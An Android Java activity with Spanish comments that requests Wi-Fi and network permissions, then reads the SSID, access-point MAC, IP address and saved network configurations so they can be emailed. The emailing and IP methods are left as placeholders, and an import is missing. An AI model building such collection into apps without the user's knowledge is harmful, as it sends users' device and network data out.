import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.List;

public class PermisosWifi extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_NETWORK_STATE,
            Manifest.permission.CHANGE_WIFI_STATE
    };

    // ... (resto de tu actividad)

    private void solicitarPermisos() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!tienePermisos()) {
                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
            } else {
                obtenerInformacionWifi();
            }
        } else {
            // En versiones anteriores a Marshmallow, los permisos se otorgan en la instalación
            obtenerInformacionWifi();
        }
    }

    private boolean tienePermisos() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                obtenerInformacionWifi();
            } else {
                // El usuario denegó los permisos
                Log.e("PermisosWifi", "Permisos denegados");
                // Aquí puedes mostrar un mensaje al usuario o tomar alguna acción
            }
        }
    }

    private void obtenerInformacionWifi() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();

        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();

        String ssid = wifiInfo.getSSID(); // Nombre de la red WiFi
        String bssid = wifiInfo.getBSSID(); // Dirección MAC del punto de acceso
        String ipAddress = obtenerDireccionIP(wifiInfo); 

        List<WifiConfiguration> redesGuardadas = wifiManager.getConfiguredNetworks();

        // Aquí puedes recopilar la información y enviarla por correo electrónico
        enviarCorreoElectronico(isConnected, ssid, bssid, ipAddress, redesGuardadas);
    }

    // ... (Métodos para obtener la dirección IP y enviar el correo electrónico)
}
